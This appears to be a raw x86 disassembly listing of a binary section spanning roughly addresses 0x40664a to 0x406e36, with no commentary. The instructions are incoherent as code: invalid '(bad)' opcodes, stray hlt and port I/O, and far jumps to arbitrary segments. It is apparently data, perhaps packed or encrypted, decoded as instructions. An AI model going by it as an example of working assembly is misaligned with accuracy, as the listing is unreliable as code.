  40664a:	cmp    BYTE PTR [eax+0x7b],dl
  40664d:	dec    ecx
  40664e:	pop    es
  40664f:	jne    0x40662a
  406651:	or     eax,0x79e4727f
  406656:	test   al,0x6f
  406658:	hlt    
  406659:	hlt    
  40665a:	mov    eax,ds:0x9a071744
  40665f:	dec    esp
  406660:	stc    
  406661:	mov    edx,0x54203100
  406666:	cmp    BYTE PTR [ecx],dl
  406668:	outs   dx,DWORD PTR ds:[esi]
  406669:	hlt    
  40666a:	mov    BYTE PTR ds:0x1bfa1380,al
  406670:	pop    eax
  406671:	adc    ch,dh
  406673:	test   cl,dh
  406675:	mov    bh,0x6b
  406677:	mov    eax,ds:0x68e82f4b
  40667c:	xchg   edx,eax
  40667d:	test   al,0x1
  40667f:	mov    bh,0x7d
  406681:	idiv   BYTE PTR ds:0xec74ab71
  406687:	push   edi
  406688:	sub    al,0x38
  40668a:	in     al,0xdc
  40668c:	dec    ebp
  40668d:	dec    DWORD PTR [esi]
  40668f:	mov    al,ds:0x320c834
  406694:	aaa    
  406695:	push   es
  406696:	mov    bl,BYTE PTR [edi+esi*1+0x7]
  40669a:	sub    bl,al
  40669c:	xchg   ecx,eax
  40669d:	rcr    eax,0xf8
  4066a0:	jb     0x4066bc
  4066a2:	inc    ebx
  4066a3:	mov    BYTE PTR [ebp+0x46],al
  4066a6:	inc    ebp
  4066a7:	inc    ebp
  4066a8:	stos   DWORD PTR es:[edi],eax
  4066a9:	std    
  4066aa:	add    dl,al
  4066ac:	mov    bh,0xfe
  4066ae:	push   cs
  4066af:	dec    bl
  4066b1:	jne    0x40669d
  4066b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066b4:	cmp    esi,0xc
  4066b7:	jge    0x4066c3
  4066b9:	mov    BYTE PTR [eax],dl
  4066bb:	jo     0x4066b6
  4066bd:	sub    eax,0xc875440a
  4066c2:	or     eax,0xa47c63ea
  4066c7:	xor    edi,eax
  4066c9:	pop    ds
  4066ca:	ja     0x4066d3
  4066cc:	jne    0x406710
  4066ce:	cld    
  4066cf:	setb   BYTE PTR [ebp+0x3e]
  4066d3:	les    ecx,FWORD PTR [ebx-0x19b8ca5]
  4066d9:	mov    DWORD PTR ds:0xf0cc7906,0x9da0976
  4066e3:	cmp    al,0x9
  4066e5:	add    BYTE PTR [eax+0x6b],al
  4066e8:	mov    BYTE PTR [ebx+0x3c],dl
  4066eb:	leave  
  4066ec:	mov    ds:0x8225a3ae,al
  4066f1:	call   0xe41b:0x966eeb6
  4066f8:	jmpw   0x55ff
  4066fc:	(bad)  
  4066fd:	loopne 0x40675c
  4066ff:	(bad)
  406703:	cmp    cl,al
  406705:	call   0xaa478614
  40670a:	iret   
  40670b:	fild   DWORD PTR [eax-0x42]
  40670e:	cwde   
  40670f:	mov    ds:0x8b9bf24,eax
  406714:	and    ebx,DWORD PTR [ebp+ebp*2+0x2821274]
  40671b:	imul   BYTE PTR [ebp-0x2725eb5]
  406721:	ss add al,0xb9
  406724:	adc    eax,esi
  406726:	pop    esi
  406727:	inc    ebp
  406728:	add    BYTE PTR [esi],al
  40672a:	inc    esp
  40672b:	jge    0x40670c
  40672d:	fistp  WORD PTR [edi+0x60]
  406730:	mov    ds:0x501c5519,eax
  406735:	pop    ecx
  406736:	mov    eax,0xb145ba3b
  40673b:	jmp    0x4067b5
  40673d:	jg     0x406746
  40673f:	mov    eax,0x950fac1d
  406744:	ret    
  406745:	mov    BYTE PTR ds:0x370c1126,bl
  40674b:	shr    al,1
  40674d:	jno    0x406785
  40674f:	xor    BYTE PTR [eax-0x1ee4a630],bh
  406755:	ficom  WORD PTR [esp+eiz*4]
  406758:	mov    BYTE PTR [edx],al
  40675a:	inc    eax
  40675b:	inc    edx
  40675c:	addr16 pop ds
  40675e:	cmc    
  40675f:	test   al,0x54
  406761:	mov    esp,0x47102e46
  406766:	push   ebx
  406767:	adc    ebx,esp
  406769:	fnstcw WORD PTR [esi+eiz*2+0x68]
  40676d:	neg    BYTE PTR [ebx]
  40676f:	add    eax,0x242211b
  406774:	pop    ebp
  406775:	mov    edi,0xf1503b30
  40677a:	mov    esi,0x836621fd
  40677f:	cmp    bl,BYTE PTR [ebp+0xd88c194]
  406785:	pop    ecx
  406786:	sar    DWORD PTR [edi+0x3653b501],cl
  40678c:	jns    0x4067d6
  40678e:	jne    0x406779
  406790:	jmp    0x4067c0
  406792:	push   0x4a
  406794:	cli    
  406795:	sub    al,0xd9
  406797:	out    dx,eax
  406798:	dec    sp
  40679a:	pusha  
  40679b:	xchg   ebp,eax
  40679c:	shl    BYTE PTR [edx+0x102a6a1c],0x92
  4067a3:	popa   
  4067a4:	add    eax,0xb707bb05
  4067a9:	in     eax,0x45
  4067ab:	xor    BYTE PTR [edx+esi*4],ch
  4067ae:	add    BYTE PTR [edi+0x18],dh
  4067b1:	outs   dx,DWORD PTR ds:[esi]
  4067b2:	repnz lods al,BYTE PTR ds:[esi]
  4067b4:	jg     0x40677a
  4067b6:	dec    ecx
  4067b7:	jne    0x4067b2
  4067b9:	push   ebx
  4067ba:	ret    0xfa6
  4067bd:	dec    edx
  4067be:	add    al,0xc3
  4067c0:	jmp    0xae5f:0x98eec8a0
  4067c7:	push   0x8d2ad844
  4067cc:	jo     0x406751
  4067ce:	push   edx
  4067cf:	add    DWORD PTR [eax-0x59],0xffffffe2
  4067d3:	adc    bl,al
  4067d5:	mov    edx,0x11d0d414
  4067da:	xor    al,0x8a
  4067dc:	sub    eax,DWORD PTR [edx-0x2227870b]
  4067e2:	mov    DWORD PTR [esi-0x62],ecx
  4067e5:	pop    esi
  4067e6:	dec    esp
  4067e7:	and    al,0xba
  4067e9:	sbb    esp,DWORD PTR [ecx]
  4067eb:	push   ecx
  4067ec:	addr16 push eax
  4067ee:	or     edx,DWORD PTR [edi+edi*2]
  4067f1:	mov    ds:0x73641903,al
  4067f6:	xchg   edx,eax
  4067f7:	and    ebp,eax
  4067f9:	sbb    al,0xc0
  4067fb:	mov    al,0x1f
  4067fd:	nop
  4067fe:	call   0xba6d1980
  406803:	nop    DWORD PTR [esi+0x7eaff90b]
  40680a:	adc    bh,BYTE PTR [esi-0x4f]
  40680d:	cs mov edx,0xe4497f0e
  406813:	add    DWORD PTR [ecx],edi
  406815:	nop
  406816:	inc    ecx
  406817:	sbb    esp,esp
  406819:	inc    edi
  40681a:	xchg   esi,eax
  40681b:	or     edi,ebx
  40681d:	xor    BYTE PTR [ecx+0x361dba2f],0x81
  406824:	fdiv   QWORD PTR [eax]
  406826:	mov    edx,0x90380d76
  40682b:	pop    ds
  40682c:	fdivr  QWORD PTR [eax+0x1e208ed1]
  406832:	sbb    esp,esp
  406834:	pop    ecx
  406835:	loopne 0x4067bb
  406837:	aam    0x2c
  406839:	inc    eax
  40683a:	mov    edx,0xe5906720
  40683f:	inc    eax
  406840:	aam    0xd8
  406842:	fsubr  DWORD PTR [edi+edx*1-0xa]
  406846:	xchg   ecx,eax
  406847:	mov    BYTE PTR [ecx+0x6c1eba3a],dh
  40684d:	mov    WORD PTR [edi],?
  40684f:	shl    dl,1
  406851:	sbb    eax,0xba588f08
  406856:	sub    BYTE PTR [ebx],dh
  406858:	shl    BYTE PTR [ecx-0x70],1
  40685b:	jae    0x40687d
  40685d:	(bad)  
  40685e:	or     eax,0xba6421cc
  406863:	sub    esp,ecx
  406865:	dec    eax
  406866:	adc    eax,DWORD PTR [edx-0x3d1a6b37]
  40686c:	push   cs
  40686d:	fs nop
  40686f:	ins    DWORD PTR es:[edi],dx
  406870:	test   eax,0xc2acc825
  406876:	inc    eax
  406877:	inc    ecx
  406878:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406879:	inc    ecx
  40687a:	pop    ecx
  40687b:	mov    esi,0x70a67207
  406880:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406881:	jl     0x4068c1
  406883:	enter  0xbbc4,0xe4
  406887:	inc    eax
  406888:	push   es
  406889:	and    eax,esp
  40688b:	aas    
  40688c:	popa   
  40688d:	enter  0x1c80,0x64
  406891:	rol    BYTE PTR ds:0x4df2c010,0xf2
  406898:	dec    esp
  406899:	hlt    
  40689a:	mov    al,bh
  40689c:	push   cs
  40689d:	cwde   
  40689e:	(bad)  
  40689f:	push   ss
  4068a0:	aam    0x28
  4068a2:	test   DWORD PTR [ebx],ecx
  4068a4:	cld    
  4068a5:	push   ebp
  4068a6:	push   cs
  4068a7:	add    bh,BYTE PTR [ebp-0x25]
  4068aa:	test   al,0x7
  4068ac:	hlt    
  4068ad:	enter  0xd698,0x30
  4068b1:	mov    WORD PTR [eax+0x1ccb9064],?
  4068b7:	mov    ah,0x9c
  4068b9:	pop    es
  4068ba:	lods   al,BYTE PTR ds:[esi]
  4068bb:	adc    edx,edx
  4068bd:	clc    
  4068be:	or     al,0x57
  4068c0:	inc    esi
  4068c1:	lds    esp,FWORD PTR [esi+0x248c6616]
  4068c7:	jbe    0x406861
  4068c9:	mov    edx,0x7df63110
  4068ce:	sbb    DWORD PTR [edx+0x6d06ef02],esi
  4068d4:	das    
  4068d5:	fs das 
  4068d7:	hlt    
  4068d8:	out    dx,al
  4068d9:	or     eax,DWORD PTR [esi]
  4068db:	add    edx,DWORD PTR [edi+0x6d]
  4068de:	add    BYTE PTR [eax],ah
  4068e0:	fs sub al,0x20
  4068e3:	cs mov ebx,0x22f180c
  4068e9:	popa   
  4068ea:	ins    DWORD PTR es:[edi],dx
  4068eb:	or     esi,DWORD PTR [eax-0x20]
  4068ee:	cmp    BYTE PTR [ebp+0x41],0x4b
  4068f2:	push   0x76686823
  4068f7:	and    BYTE PTR [esi],ah
  4068f9:	and    DWORD PTR [ebx],0x20
  4068fc:	sub    BYTE PTR [edi],cl
  4068fe:	mov    ebx,0xe5be00c
  406903:	and    BYTE PTR [edi-0x114899c6],bh
  406909:	cs pop ecx
  40690b:	or     DWORD PTR [ebx],0x3a
  40690e:	jae    0x406983
  406910:	sbb    esp,DWORD PTR ds:0x260463cd
  406916:	adc    ebx,DWORD PTR [eax+edx*1+0x17f4ec7f]
  40691d:	add    BYTE PTR [esp+eiz*8+0x54a77b48],bl
  406924:	dec    edx
  406925:	clc    
  406926:	sub    BYTE PTR [ebp+edx*1+0x3d],ch
  40692a:	cmp    esi,DWORD PTR [edi]
  40692c:	push   0xd55a60c6
  406931:	test   BYTE PTR ds:0x827cecdf,al
  406937:	clc    
  406938:	push   esp
  406939:	fwait
  40693a:	or     eax,0x6a0efc13
  406940:	add    DWORD PTR [edx-0x64],eax
  406943:	iret   
  406944:	mov    ss,WORD PTR [ebp+0x47]
  406947:	enter  0xc59,0xee
  40694b:	jno    0x406966
  40694d:	nop
  40694e:	fist   WORD PTR [edx*1-0x768fd3b8]
  406955:	pop    edx
  406956:	add    DWORD PTR [ebx-0x3d38d3bd],eax
  40695c:	or     cl,BYTE PTR [edi]
  40695e:	sbb    esp,DWORD PTR [ecx]
  406960:	and    ebx,ecx
  406962:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406963:	pop    ebx
  406964:	in     al,dx
  406965:	inc    esp
  406966:	push   ebx
  406967:	jge    0x40697c
  406969:	add    eax,0xf175e9ea
  40696e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40696f:	(bad)  
  406970:	fbld   TBYTE PTR [edx+0x31aaa685]
  406976:	inc    ebx
  406977:	mov    dh,ah
  406979:	adc    eax,0xc6ad89c4
  40697e:	add    ebx,DWORD PTR [eax]
  406980:	and    BYTE PTR [edx],bl
  406982:	or     eax,0x24
  406985:	or     BYTE PTR [esi],al
  406987:	outs   dx,DWORD PTR ds:[esi]
  406988:	adc    bl,BYTE PTR [ebp-0xb]
  40698b:	pop    es
  40698c:	adc    ch,ah
  40698e:	add    edx,DWORD PTR [esi+0x7c]
  406991:	(bad)  
  406992:	and    bh,BYTE PTR [ebx+0x184bc3d4]
  406998:	data16 in al,0x53
  40699b:	adc    BYTE PTR [eax],ah
  40699d:	fcomp  st(2)
  40699f:	or     DWORD PTR ds:0x87284198,0x280a2e05
  4069a9:	sbb    ch,bl
  4069ab:	or     ch,BYTE PTR [eax+0x445b1288]
  4069b1:	cld    
  4069b2:	lahf   
  4069b3:	inc    eax
  4069b4:	xchg   ebx,eax
  4069b5:	inc    esp
  4069b6:	imul   esi,DWORD PTR [ebx+0x6b],0x65657246
  4069bd:	push   ebx
  4069be:	jo     0x406980
  4069c0:	pop    ds
  4069c1:	jmp    0x41:0x78459c1b
  4069c8:	lea    edx,[edx-0x573ef010]
  4069ce:	ds jbe 0x406989
  4069d1:	gs ret 
  4069d3:	mov    edx,0xc3480b58
  4069d8:	xchg   DWORD PTR [eax],edx
  4069da:	adc    ah,BYTE PTR [edx]
  4069dc:	cwde   
  4069dd:	cmp    eax,0x154b1a07
  4069e2:	cmc    
  4069e3:	inc    eax
  4069e4:	inc    eax
  4069e5:	jmp    0x87d8:0x821e0a88
  4069ec:	lea    esi,[eax+ebp*1+0x8]
  4069f0:	adc    cl,dh
  4069f2:	rcr    dh,1
  4069f4:	xchg   edx,eax
  4069f5:	inc    esp
  4069f6:	lahf   
  4069f7:	add    al,0xc0
  4069f9:	jne    0x406a02
  4069fb:	aad    0x2
  4069fd:	loop   0x406a14
  4069ff:	sbb    dh,al
  406a01:	ror    BYTE PTR [ebx+0x71],1
  406a04:	(bad)  
  406a05:	imul   ah
  406a07:	int3   
  406a08:	aad    0xe3
  406a0a:	adc    cl,dh
  406a0c:	sbb    ah,al
  406a0e:	in     eax,dx
  406a0f:	jne    0x4069e2
  406a11:	mov    bh,BYTE PTR ds:0x2245e280
  406a17:	cmp    BYTE PTR [eax+0x76c70502],al
  406a1d:	dec    ebp
  406a1e:	jle    0x406a27
  406a20:	or     al,0x24
  406a22:	in     al,dx
  406a23:	cmp    edi,DWORD PTR [ebx+0x515c3835]
  406a29:	mov    cl,0x89
  406a2b:	inc    edi
  406a2c:	dec    BYTE PTR [edx+0x5d0e8402]
  406a32:	bound  esi,QWORD PTR [edx]
  406a34:	push   es
  406a35:	and    al,0xf
  406a37:	mov    bh,0x13
  406a39:	jno    0x406a5d
  406a3b:	jb     0x406a01
  406a3d:	mov    eax,0x8562878f
  406a42:	and    edi,ebp
  406a44:	test   al,0x88
  406a46:	adc    ebp,DWORD PTR [eax+ebp*1]
  406a49:	dec    eax
  406a4a:	inc    esp
  406a4b:	das    
  406a4c:	fisttp DWORD PTR [edx+0x7868cc3]
  406a52:	jmp    0x406a5a
  406a54:	inc    ebx
  406a55:	mov    eax,0xa960adc4
  406a5a:	pop    es
  406a5b:	cmp    ebx,ebp
  406a5d:	jne    0x406a4d
  406a5f:	js     0x406a77
  406a61:	(bad)  
  406a62:	mov    esi,0xa932410d
  406a67:	inc    esp
  406a68:	sbb    esi,DWORD PTR [ebx]
  406a6a:	mov    eax,0xc1ee95bc
  406a6f:	lock pop ebx
  406a71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a72:	mov    DWORD PTR ds:0x40c70489,esp
  406a78:	or     BYTE PTR [edi+0x61],bl
  406a7b:	cmp    edx,DWORD PTR [eax]
  406a7d:	fmul   QWORD PTR [edi]
  406a7f:	pop    ss
  406a80:	into   
  406a81:	push   eax
  406a82:	lea    ebx,[esp+esi*2+0x5f]
  406a86:	xor    ecx,DWORD PTR [ebx]
  406a88:	push   0xe402120c
  406a8d:	pop    edx
  406a8e:	mov    ah,BYTE PTR [eax-0xf]
  406a91:	sbb    eax,ebp
  406a93:	sbb    eax,DWORD PTR [edx]
  406a95:	pop    ebp
  406a96:	ins    BYTE PTR es:[edi],dx
  406a97:	inc    ecx
  406a98:	or     edx,DWORD PTR [esi+0x50590258]
  406a9e:	pop    DWORD PTR [ebx]
  406aa0:	aam    0x8b
  406aa2:	or     BYTE PTR [edi+0xb305b2e],ch
  406aa8:	xchg   ecx,eax
  406aa9:	jo     0x406a45
  406aab:	int3   
  406aac:	pop    ds
  406aad:	sbb    esi,0x6
  406ab0:	push   esp
  406ab1:	jns    0x406acc
  406ab3:	xor    BYTE PTR [edi+0x1acf60ba],bh
  406ab9:	mov    esp,0x81d850cf
  406abe:	sti    
  406abf:	or     al,0xfb
  406ac1:	rcl    DWORD PTR [esi],0x89
  406ac4:	adc    BYTE PTR [edx+0x442f500],0xeb
  406acb:	or     edi,DWORD PTR [esi]
  406acd:	add    eax,DWORD PTR [ecx+0x5f745566]
  406ad3:	jecxz  0x406a5a
  406ad5:	cli    
  406ad6:	fcom   DWORD PTR [edi+0x68]
  406ad9:	ror    al,cl
  406adb:	and    bl,BYTE PTR [eax]
  406add:	mov    DWORD PTR [esi-0x17],0x637211f
  406ae4:	jno    0x406ae5
  406ae6:	add    DWORD PTR [esi+0x10468990],edi
  406aec:	mov    dh,0xc9
  406aee:	bound  edx,QWORD PTR [ecx+0x78]
  406af1:	unpcklps xmm4,XMMWORD PTR [esi]
  406af4:	sbb    BYTE PTR [ebp-0x4f],ch
  406af7:	arpl   WORD PTR [ebx+ebx*8],bx
  406afa:	mov    esi,0x1539185a
  406aff:	and    BYTE PTR [ebx],al
  406b01:	push   es
  406b02:	adc    BYTE PTR [eax+0x23c6d043],ch
  406b08:	ret    
  406b09:	mov    cl,BYTE PTR [edx+0x6ddeea30]
  406b0f:	in     al,0xa1
  406b11:	shr    BYTE PTR [edx-0x3949a768],1
  406b17:	mov    esp,DWORD PTR [edx+0x43]
  406b1a:	mov    dh,0x48
  406b1c:	add    al,0x8c
  406b1e:	or     BYTE PTR [ecx+edx*4],dl
  406b21:	xchg   dh,dh
  406b23:	and    BYTE PTR [eax],0x8
  406b26:	push   ecx
  406b27:	into   
  406b28:	mov    BYTE PTR [esi],0xec
  406b2b:	fmul   DWORD PTR [ecx]
  406b2d:	pop    ds
  406b2e:	inc    eax
  406b2f:	sub    DWORD PTR [ebx+0x68],ecx
  406b32:	or     edi,DWORD PTR [eax+0x3b]
  406b35:	in     al,dx
  406b36:	dec    ebx
  406b37:	inc    esi
  406b38:	adc    al,0x50
  406b3a:	sbb    BYTE PTR [edx+0x1b],dl
  406b3d:	nop
  406b3e:	nop    DWORD PTR [edx+0x49]
  406b42:	es adc al,0xb
  406b45:	call   0x36836cfd
  406b4a:	cli    
  406b4b:	or     DWORD PTR [edi],esp
  406b4d:	clc    
  406b4e:	cmp    edi,DWORD PTR [ebp+0x24]
  406b51:	repz test BYTE PTR [ecx],cl
  406b54:	mov    dl,cl
  406b56:	(bad)  
  406b57:	stos   BYTE PTR es:[edi],al
  406b58:	push   esp
  406b59:	data16 sub dh,dh
  406b5c:	xor    al,0x6
  406b5e:	sbb    DWORD PTR [eax-0x5f5779a1],ebp
  406b64:	add    al,0x8d
  406b66:	dec    ebx
  406b67:	int    0x52
  406b69:	test   DWORD PTR [edi],0x24e2c397
  406b6f:	xchg   ecx,eax
  406b70:	or     al,0xa7
  406b72:	push   0x1a
  406b74:	add    ebp,edx
  406b76:	cmp    esi,DWORD PTR [ecx+ecx*1-0x46]
  406b7a:	xor    BYTE PTR [esp+edx*1],ah
  406b7d:	inc    ebp
  406b7e:	arpl   WORD PTR [esi+0x4207ecef],bp
  406b84:	mov    BYTE PTR [ecx],bl
  406b86:	add    DWORD PTR [edx+0x19],ebx
  406b89:	cmp    eax,0x7ec1749c
  406b8e:	and    esi,DWORD PTR [ebp-0x2e]
  406b91:	pop    ebp
  406b92:	inc    edx
  406b93:	or     BYTE PTR [eax+0x2dd23b85],ch
  406b99:	cwde   
  406b9a:	jge    0x406be9
  406b9c:	sub    BYTE PTR [eax+0x3b],cl
  406b9f:	jb     0x406b61
  406ba1:	pusha  
  406ba2:	adc    al,0xbe
  406ba4:	pop    ebp
  406ba5:	ret    
  406ba6:	inc    DWORD PTR [ebp+0x1c]
  406ba9:	out    dx,al
  406baa:	adc    BYTE PTR [eax+0x33a4ff6d],dl
  406bb0:	mov    eax,DWORD PTR [esi+0x1c4bff43]
  406bb6:	cmp    DWORD PTR [ebx+0x1c],0x49
  406bba:	and    BYTE PTR [ebp+0x7],bh
  406bbd:	mov    dh,0x35
  406bbf:	sbb    eax,0x7c433843
  406bc4:	ret    
  406bc5:	pop    ebx
  406bc6:	ins    BYTE PTR es:[edi],dx
  406bc7:	push   ds
  406bc8:	call   0xaf60:0x69d
  406bce:	sar    DWORD PTR [ebx],0xa9
  406bd1:	xor    al,0xf7
  406bd3:	rol    DWORD PTR [eax+ecx*1-0x2707003d],1
  406bda:	rcr    DWORD PTR [ebp+edi*1+0x40ff4749],0xc
  406be2:	fiadd  WORD PTR [ecx]
  406be4:	adc    dh,bh
  406be6:	dec    eax
  406be7:	mov    bh,0x1f
  406be9:	cmp    eax,DWORD PTR [edi+0x24]
  406bec:	je     0x406c2e
  406bee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bef:	jne    0x406c2d
  406bf1:	dec    eax
  406bf2:	stos   BYTE PTR es:[edi],al
  406bf3:	js     0x406be0
  406bf5:	daa    
  406bf6:	lea    eax,[edi-0x3b]
  406bf9:	sbb    al,0x44
  406bfb:	int3   
  406bfc:	icebp  
  406bfd:	jge    0x406bca
  406bff:	add    eax,0x633bc63b
  406c04:	outs   dx,DWORD PTR ds:[esi]
  406c05:	adc    esp,DWORD PTR [esi+0x6ec028b8]
  406c0b:	add    edi,ebp
  406c0d:	es aad 0xad
  406c10:	int    0x5a
  406c12:	mov    edi,0x17ec392d
  406c17:	ins    DWORD PTR es:[edi],dx
  406c18:	dec    eax
  406c19:	or     al,0x9c
  406c1b:	dec    eax
  406c1c:	in     al,0x33
  406c1e:	mov    bh,0x9c
  406c20:	jbe    0x406c65
  406c22:	xor    al,0xd4
  406c24:	imul   ecx,eax,0x45b1f981
  406c2a:	sbb    eax,0xebd9096c
  406c2f:	sbb    DWORD PTR [esi],eax
  406c31:	adc    eax,0x12e7dccd
  406c36:	loop   0x406c37
  406c38:	inc    DWORD PTR [ebp+0x701a84d2]
  406c3e:	sbb    al,0x68
  406c40:	fcmovu st,st(2)
  406c42:	mov    edx,DWORD PTR [eax]
  406c44:	aaa    
  406c45:	or     BYTE PTR [esi],bh
  406c47:	xor    al,0x6
  406c49:	cmp    bh,BYTE PTR [edx+0x61]
  406c4c:	jecxz  0x406c98
  406c4e:	ret    0x7bf8
  406c51:	cdq    
  406c52:	mov    ds:0x7acba69,al
  406c57:	lock dec esp
  406c59:	call   0x4d753fe1
  406c5e:	rcl    DWORD PTR [edi],cl
  406c60:	loopne 0x406c32
  406c62:	fsub   st,st(4)
  406c64:	ror    BYTE PTR [ebp-0x2d],1
  406c67:	xor    al,0x5d
  406c69:	in     al,dx
  406c6a:	bswap  eax
  406c6c:	cmp    al,al
  406c6e:	je     0x406c28
  406c70:	xor    al,0x5d
  406c72:	shl    DWORD PTR ds:0x70b00758,cl
  406c78:	push   gs
  406c7a:	sbb    BYTE PTR [ecx+0x2e],ch
  406c7d:	dec    ebp
  406c7e:	shl    DWORD PTR [eax+0x14489820],cl
  406c84:	nop
  406c85:	scas   al,BYTE PTR es:[edi]
  406c86:	imul   ebx,DWORD PTR [edx+0x44881ca6],0x75179c80
  406c90:	lahf   
  406c91:	imul   ebx,DWORD PTR [edx+0x7f708878],0xee300768
  406c9b:	xor    ebx,DWORD PTR [ebp-0x2d]
  406c9e:	pop    ss
  406c9f:	pusha  
  406ca0:	sub    al,0xf
  406ca2:	pop    eax
  406ca3:	dec    edi
  406ca4:	push   eax
  406ca5:	pop    es
  406ca6:	je     0x406cf5
  406ca8:	xlat   BYTE PTR ds:[ebx]
  406ca9:	jge    0x406cfa
  406cab:	dec    eax
  406cac:	ja     0x406c8e
  406cae:	pop    es
  406caf:	inc    eax
  406cb0:	mov    esp,0x74d73827
  406cb5:	dec    ebp
  406cb6:	xlat   BYTE PTR ds:[ebx]
  406cb7:	test   BYTE PTR [edi],al
  406cb9:	xor    ah,cl
  406cbb:	pop    ss
  406cbc:	sub    BYTE PTR [eax+0x74d17b2f],al
  406cc2:	dec    ebp
  406cc3:	and    BYTE PTR [eax],dl
  406cc5:	pop    ss
  406cc6:	sbb    BYTE PTR [eax],ch
  406cc8:	scas   eax,DWORD PTR es:[edi]
  406cc9:	adc    ebx,DWORD PTR [edx+0x10a654ee]
  406ccf:	nop
  406cd0:	daa    
  406cd1:	or     al,0xa0
  406cd3:	call   0x2308:0xbc1bac1
  406cda:	les    edx,FWORD PTR [edi]
  406cdc:	add    al,0x8c
  406cde:	xor    eax,0xbc19a4f
  406ce3:	add    al,cl
  406ce5:	inc    ecx
  406ce6:	cld    
  406ce7:	rcl    dh,0x3c
  406cea:	imul   ebx,DWORD PTR [esi-0x5707bec5],0xb24f441
  406cf4:	iret   
  406cf5:	or     al,0xd6
  406cf7:	or     al,0xf0
  406cf9:	cwde   
  406cfa:	and    ebp,esp
  406cfc:	push   ebx
  406cfd:	ror    BYTE PTR [esi+edx*8],cl
  406d00:	jl     0x406d19
  406d02:	call   0xe1247883
  406d07:	ror    BYTE PTR [esi+edx*8],cl
  406d0a:	or     al,0xe0
  406d0c:	fadd   DWORD PTR [edi-0x24]
  406d0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d10:	(bad)  
  406d11:	or     al,0xd2
  406d13:	or     al,0xd8
  406d15:	adc    al,0xd4
  406d17:	cld    
  406d18:	or     edx,esi
  406d1a:	or     al,0xd6
  406d1c:	or     al,0xd0
  406d1e:	mov    BYTE PTR [ebx],ah
  406d20:	int3   
  406d21:	aam    0xb
  406d23:	(bad)  
  406d24:	or     al,0xd6
  406d26:	or     al,0xc8
  406d28:	pusha  
  406d29:	and    eax,esp
  406d2b:	hlt    
  406d2c:	pop    ss
  406d2d:	(bad)  
  406d2e:	or     al,0xd6
  406d30:	or     al,0xc0
  406d32:	push   esp
  406d33:	or     edi,DWORD PTR [eax+edx*4-0x2df32dc5]
  406d3a:	or     al,0xb8
  406d3c:	pop    esp
  406d3d:	mov    ah,0x4
  406d3f:	(bad)  
  406d40:	or     al,0xd6
  406d42:	or     al,0xb0
  406d44:	test   BYTE PTR [edi],dl
  406d46:	lods   al,BYTE PTR ds:[esi]
  406d47:	inc    eax
  406d48:	jecxz  0x406d19
  406d4a:	sbb    eax,0x48a80cb2
  406d4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d50:	or     ecx,DWORD PTR [ecx]
  406d52:	(bad)  
  406d53:	or     al,0xd2
  406d55:	jl     0x406d92
  406d57:	mov    al,ds:0xbdc9c78
  406d5c:	lods   al,BYTE PTR ds:[esi]
  406d5d:	cmp    esp,ecx
  406d5f:	or     al,0x98
  406d61:	imul   edx,DWORD PTR [eax+edi*8-0x6788a7c5],0x19
  406d69:	nop
  406d6a:	ja     0x406cf8
  406d6c:	and    ebp,DWORD PTR [ebx+ecx*1+0x33583358]
  406d73:	mov    BYTE PTR [eax+0x23],dh
  406d76:	test   BYTE PTR [eax],cl
  406d78:	cmp    ecx,DWORD PTR [eax+0x33]
  406d7b:	pop    eax
  406d7c:	xor    eax,DWORD PTR [eax+0x387c1774]
  406d82:	dec    esi
  406d83:	xor    ebx,DWORD PTR [eax+0x33]
  406d86:	pop    eax
  406d87:	xor    BYTE PTR [ebx],bh
  406d89:	push   esp
  406d8a:	in     al,0x4e
  406d8c:	repnz nop
  406d8e:	cmp    BYTE PTR [ebx-0x77a83a50],0x3a
  406d95:	xor    dl,BYTE PTR [ecx-0x78]
  406d98:	fbstp  TBYTE PTR [eax-0x80]
  406d9b:	push   edi
  406d9c:	or     edx,esp
  406d9e:	sar    DWORD PTR [ebp-0x54],cl
  406da1:	ins    BYTE PTR es:[edi],dx
  406da2:	add    al,0xa7
  406da4:	cdq    
  406da5:	cld    
  406da6:	pop    ebp
  406da7:	mov    ebp,0x427c9ea2
  406dac:	dec    esp
  406dad:	mov    ecx,0x21d09416
  406db2:	stc    
  406db3:	and    DWORD PTR [edi-0x46ebeb04],eax
  406db9:	pop    es
  406dba:	push   eax
  406dbb:	inc    ecx
  406dbc:	sub    al,0xb9
  406dbe:	add    cl,BYTE PTR [ebx+0x724c5]
  406dc4:	add    BYTE PTR [esi+esi*2],ah
  406dc7:	pop    esp
  406dc8:	stc    
  406dc9:	es or  edx,esp
  406dcc:	test   BYTE PTR [ecx-0x697ff0c0],ah
  406dd2:	int    0x26
  406dd4:	sbb    esp,eax
  406dd6:	dec    eax
  406dd7:	push   ebx
  406dd8:	ds add esp,esp
  406ddb:	add    cl,bh
  406ddd:	adc    al,0x1c
  406ddf:	add    BYTE PTR ds:0x56f25720,bl
  406de5:	sar    BYTE PTR [ecx+0x269ca00c],1
  406deb:	cdq    
  406dec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ded:	fwait
  406dee:	xchg   edx,eax
  406def:	or     DWORD PTR [eax+0x64999094],ebx
  406df5:	xchg   edx,eax
  406df6:	dec    ecx
  406df7:	mov    BYTE PTR [eax+edi*2+0xf24dd23],al
  406dfe:	inc    eax
  406dff:	int3   
  406e00:	mov    eax,0xf2b43313
  406e05:	adc    al,BYTE PTR [edx-0x334ff4de]
  406e0b:	jns    0x406e7f
  406e0d:	adc    al,BYTE PTR [edx]
  406e0f:	jg     0x406dc2
  406e11:	cmp    BYTE PTR [ebx+0x59b762d],al
  406e17:	test   DWORD PTR [ecx],0x8077ff73
  406e1d:	sub    dl,ah
  406e1f:	or     DWORD PTR [ebp+0xbe0b46c],ebp
  406e25:	jp     0x406e23
  406e27:	push   0x5d
  406e29:	xlat   BYTE PTR ds:[ebx]
  406e2a:	xchg   DWORD PTR [eax+0x75],ebx
  406e2d:	and    eax,DWORD PTR [esi-0x46]
  406e30:	xor    eax,0x1991f4c
  406e35:	sti    
  406e36:	sbb    eax,0x7c9a867e
